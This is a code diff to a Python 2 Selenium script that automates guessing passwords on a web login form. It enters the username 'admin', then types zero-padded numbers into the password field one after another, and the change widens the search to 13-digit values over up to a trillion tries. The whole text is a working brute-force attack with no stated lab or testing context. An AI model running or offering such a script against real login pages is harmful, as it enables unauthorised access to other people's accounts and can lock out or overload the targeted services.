@@ -33,7 +33,7 @@ counter = 0
 #setup initial value to test
 psw_value=0000
 #setup total number of tries
-max_value = 100000000000
+max_value = 1000000000000
 #show the current page path
 print driver.current_url
 currentURL=driver.current_url
@@ -43,12 +43,12 @@ inputElement_id.send_keys('admin')
 
 for x in range(0, max_value):
     #debug;show the counter
-    print "Loop count %04d" % (x)
+    print "Loop count %013d" % (x)
     #clear boxe
     inputElement_psw.clear()
-    #todo: format x into '%3d'
+    #todo: format x into '%6d'
     #simulate keys into the textbox
-    psw_value=format(x,"05d")
+    psw_value=format(x,"013d")
     inputElement_psw.send_keys(psw_value)
     #simulate click on the faux button
 inputElement_id = driver.find_element_by_name('login_id')
